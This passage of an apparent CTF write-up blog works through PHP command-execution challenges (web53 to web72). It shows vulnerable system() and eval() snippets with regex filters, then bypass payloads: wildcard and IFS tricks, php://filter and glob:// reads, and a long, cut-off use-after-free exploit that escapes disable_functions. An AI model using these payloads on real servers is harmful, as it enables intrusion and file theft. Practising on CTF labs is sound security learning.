class="line">nl$&#123;IFS&#125;fla?.php||ls</span><br></pre></td></tr></table></figure><p>exp2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x27;&#x27;at$&#123;IFS&#125;fla&#x27;&#x27;g.p&#x27;&#x27;hp</span><br></pre></td></tr></table></figure><p>exp3：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c\at$&#123;IFS&#125;fla\g.p&#x27;&#x27;hp</span><br></pre></td></tr></table></figure><h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>真bt，这一把flag不好玩了</p><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;z.txt</span><br><span class="line">访问/z.txt</span><br></pre></td></tr></table></figure><h2 id="web55-a-z"><a href="#web55-a-z" class="headerlink" title="web55([a-z])"></a>web55([a-z])</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不炫技我干啥？越来越丧心病狂了，字母一个不让用，去学习一下新滴姿势</p><p>看了wp眼界开阔了好多，在这里贴两篇文章</p><blockquote><p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p></blockquote><h3 id="执行临时存储文件"><a href="#执行临时存储文件" class="headerlink" title="执行临时存储文件"></a>执行临时存储文件</h3><p>大致明白了意思，开启设置后，php在接受到未知的文件时，会临时储存利用这个特性，写一个木马并将其执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=.+/???/????????[@-[]</span><br></pre></td></tr></table></figure><p>模仿存储路径的格式并用. 将其执行。注意：通过<code>.</code>去执行sh命令不需要有执行权限</p><p><img src="https://img-blog.csdnimg.cn/28ee76cde6404a0fb58f2b1951362c64.png" alt="img"></p><h3 id="base64流"><a href="#base64流" class="headerlink" title="base64流"></a>base64流</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=/???/????64 ????.???</span><br><span class="line">#/bin/base64 flag.php</span><br></pre></td></tr></table></figure><h3 id="bzip2"><a href="#bzip2" class="headerlink" title="bzip2"></a>bzip2</h3><p>bzip2的使用<br>bzip2是linux下面的压缩文件的命令<br>我们可以通过该命令压缩flag.php 然后进行下载<br>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/???/???/????2 ????.???</span><br></pre></td></tr></table></figure><p>也就是/usr/bin/bzip2 flag.php<br>然后访问/flag.php.bz2进行下载获得flag.php</p><h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同上述方法</p><h2 id="web57"><a href="#web57" class="headerlink" title="web57($(()))"></a>web57($(()))</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 还能炫的动吗？</span><br><span class="line">//flag in 36.php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;, $c))&#123;</span><br><span class="line">        system(&quot;cat &quot;.$c.&quot;.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新姿势 $(())是0</p><blockquote><p>取反0取反是-1<br>对于有符号整数，假设2byte<br>0000 0000 0000 0000<br>~0000 0000 0000 0000<br>-&gt;<br>1111 1111 1111 1111<br>########分割线########<br>变换成我们的整数就是取反+1<br>由于最高位是1，所以是负数<br>~1111 1111 1111 1111 + 1 = 1<br>也就是-1</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$((~$(())))</span><br><span class="line">-1</span><br><span class="line">搞36个-1相加然后取反就可</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))</span><br></pre></td></tr></table></figure><h2 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>system函数被毙了</p><p>exp1：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(&#x27;flag.php&#x27;);</span><br></pre></td></tr></table></figure><p>exp2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(&#x27;flag.php&#x27;);</span><br></pre></td></tr></table></figure><h2 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h2><p>同上</p><h2 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h2><p>源码一样可能多了过滤的东西</p><p>一直玩那两个一成不变，试试include</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">post：</span><br><span class="line">c=include%0a$_GET[1];</span><br><span class="line">get：</span><br><span class="line">1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="web61"><a href="#web61" class="headerlink" title="web61"></a>web61</h2><p>源码一样可能多了过滤的东西</p><p>同上</p><h2 id="web62"><a href="#web62" class="headerlink" title="web62"></a>web62</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这题没啥好说的直接扔exp：</span><br><span class="line">c=include(&#x27;flag.php&#x27;);echo $flag;</span><br></pre></td></tr></table></figure><h2 id="web63"><a href="#web63" class="headerlink" title="web63"></a>web63</h2><p>exp2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=include(&#x27;flag.php&#x27;);var_dump(get_defined_vars());</span><br></pre></td></tr></table></figure><h2 id="web64"><a href="#web64" class="headerlink" title="web64"></a>web64</h2><p>上述方法依然 可以再此总结一下方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(&#x27;.&#x27;));</span><br><span class="line">rename(&#x27;flag.php&#x27;,&#x27;1.txt&#x27;)</span><br><span class="line">curl函数传参(ssrf)</span><br><span class="line">高亮和show_source</span><br><span class="line">文件包含</span><br><span class="line">file_get_contents()</span><br></pre></td></tr></table></figure><h2 id="web65"><a href="#web65" class="headerlink" title="web65"></a>web65</h2><p>上面的方法依然可以</p><h2 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h2><p>禁掉了show_source()</p><p>使用highlight_file(‘flag.php’)</p><p><img src="https://img-blog.csdnimg.cn/068b05aad5134b25868f134d54fa338e.png" alt="img"></p><p>查看根目录下文件内容，发现flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(&#x27;/&#x27;));</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/c69c3c950edd4ad283171aca10480935.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=highlight_file(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure><h2 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h2><p>同上</p><h2 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h2><p><img src="https://img-blog.csdnimg.cn/f3742783fac644ce8b7fdd12ed9e7f4e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>开屏暴击！！！</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure><h2 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h2><p>同上</p><h2 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h2><p>同上</p><h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><p>先试了试payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/df017f5918ad457a9256733b52626d1d.png" alt="img"></p><p>发现题目给了附件康康</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure><p>ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲</p><p>感觉要寄了，真没思路了</p><p>看了payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&#x27;/flag.txt&#x27;);exit(0);</span><br></pre></td></tr></table></figure><h2 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h2><p>限制了include路径有点太绝了</p><p>学习了新的姿势</p><h3 id="glob-—-查找匹配的文件路径模式"><a href="#glob-—-查找匹配的文件路径模式" class="headerlink" title="glob:// — 查找匹配的文件路径模式"></a>glob:// — 查找匹配的文件路径模式</h3><p><a href="https://blog.csdn.net/unexpectedthing/article/details/121916703">(43条消息) 绕过open_basedir的限制_unexpectedthing的博客-CSDN博客</a></p><p>贴一篇文章查找根目录下的文件夹</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=?&gt;&lt;?php</span><br><span class="line">$dir=new DirectoryIterator(&#x27;glob:///*&#x27;);</span><br><span class="line">foreach($dir as $d)&#123;</span><br><span class="line">    echo $d-&gt;__toString().&#x27;&lt;/br&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    exit();</span><br><span class="line">?&gt;</span><br><span class="line">//url编码</span><br></pre></td></tr></table></figure><p>还有一个方法利用蚁剑</p><p>发现flag0.txt</p><p>因为include被路径限制了，试了试uaf，很强读取flag</p><h3 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line">?&gt;&lt;?php</span><br><span class="line"></span><br><span class="line">function ctfshow($cmd) &#123;</span><br><span class="line">    global $abc, $helper, $backtrace;</span><br><span class="line"></span><br><span class="line">    class Vuln &#123;</span><br><span class="line">        public $a;</span><br><span class="line">        public function __destruct() &#123; </span><br><span class="line">            global $backtrace; </span><br><span class="line">            unset($this-&gt;a);</span><br><span class="line">            $backtrace = (new Exception)-&gt;getTrace();</span><br><span class="line">            if(!isset($backtrace[1][&#x27;args&#x27;])) &#123;</span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class Helper &#123;</span><br><span class="line">        public $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;</span><br><span class="line">        $address = 0;</span><br><span class="line">        for($j = $s-1; $j &gt;= 0; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= 8;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        return $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function ptr2str($ptr, $m = 8) &#123;</span><br><span class="line">        $out = &quot;&quot;;</span><br><span class="line">        for ($i=0; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff));</span><br><span class="line">            $ptr &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function write(&amp;$str, $p, $v, $n = 8) &#123;</span><br><span class="line">        $i = 0;</span><br><span class="line">        for($i = 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff));</span><br><span class="line">            $v &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function leak($addr, $p = 0, $s = 8) &#123;</span><br><span class="line">        global $abc, $helper;</span><br><span class="line">        write($abc, 0x68, $addr + $p - 0x10);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;</span><br><span class="line">        return $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function parse_elf($base) &#123;</span><br><span class="line">        $e_type = leak($base, 0x10, 2);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, 0x20);</span><br><span class="line">        $e_phentsize = leak($base, 0x36, 2);</span><br><span class="line">        $e_phnum = leak($base, 0x38, 2);</span><br><span class="line"></span><br><span class="line">        for($i = 0; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, 0, 4);</span><br><span class="line">            $p_flags = leak($header, 4, 4);</span><br><span class="line">            $p_vaddr = leak($header, 0x10);</span><br><span class="line">            $p_memsz = leak($header, 0x28);</span><br><span class="line"></span><br><span class="line">            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; </span><br><span class="line"></span><br><span class="line">                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; </span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            return false;</span><br><span class="line"></span><br><span class="line">        return [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_basic_funcs($base, $elf) &#123;</span><br><span class="line">        list($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                if($deref != 0x746e6174736e6f63)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + 4) * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                if($deref != 0x786568326e6962)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            return $data_addr + $i * 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_binary_base($binary_leak) &#123;</span><br><span class="line">        $base = 0;</span><br><span class="line">        $start = $binary_leak &amp; 0xfffffffffffff000;</span><br><span class="line">        for($i = 0; $i &lt; 0x1000; $i++) &#123;</span><br><span class="line">            $addr = $start - 0x1000 * $i;</span><br><span class="line">            $leak = leak($addr, 0, 7);</span><br><span class="line">            if($leak == 0x10102464c457f) &#123;</span><br><span class="line">                return $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_system($basic_funcs) &#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        do &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, 0, 6);</span><br><span class="line"></span><br><span class="line">            if($f_name == 0x6d6574737973) &#123;</span><br><span class="line">                return leak($addr + 8);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += 0x20;</span><br><span class="line">        &#125; while($f_entry != 0);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function trigger_uaf($arg) &#123;</span><br><span class="line"></span><br><span class="line">        $arg = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;);</span><br><span class="line">        $vuln = new Vuln();</span><br><span class="line">        $vuln-&gt;a = $arg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123;</span><br><span class="line">        die(&#x27;This PoC is for *nix systems only.&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = 10; </span><br><span class="line">    $contiguous = [];</span><br><span class="line">    for($i = 0; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;);</span><br><span class="line"></span><br><span class="line">    trigger_uaf(&#x27;x&#x27;);</span><br><span class="line">    $abc = $backtrace[1][&#x27;args&#x27;][0];</span><br><span class="line"></span><br><span class="line">    $helper = new Helper;</span><br><span class="line">    $helper-&gt;b = function ($x) &#123; &#125;;</span><br><span class="line"></span><br><span class="line">    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;</span><br><span class="line">        die(&quot;UAF failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $closure_handlers = str2ptr($abc, 0);</span><br><span class="line">    $php_heap = str2ptr($abc, 0x58);</span><br><span class="line">    $abc_addr = $php_heap - 0xc8;</span><br><span class="line"></span><br><span class="line">    write($abc, 0x60, 2);</span><br><span class="line">    write($abc, 0x70, 6);</span><br><span class="line"></span><br><span class="line">    write($abc, 0x10, $abc_addr + 0x60);</span><br><span 